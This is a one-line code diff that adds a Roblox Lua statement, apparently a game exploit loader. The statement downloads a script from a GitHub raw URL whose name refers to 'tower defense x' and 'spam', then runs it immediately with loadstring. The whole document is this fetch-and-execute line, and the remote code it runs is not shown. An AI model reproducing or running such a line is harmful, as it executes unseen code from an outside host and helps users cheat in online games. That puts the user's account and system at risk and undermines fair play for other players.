@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/tb-ii-tower-defense-x-beta-spam3-5j10icwfol2124.lua"))()
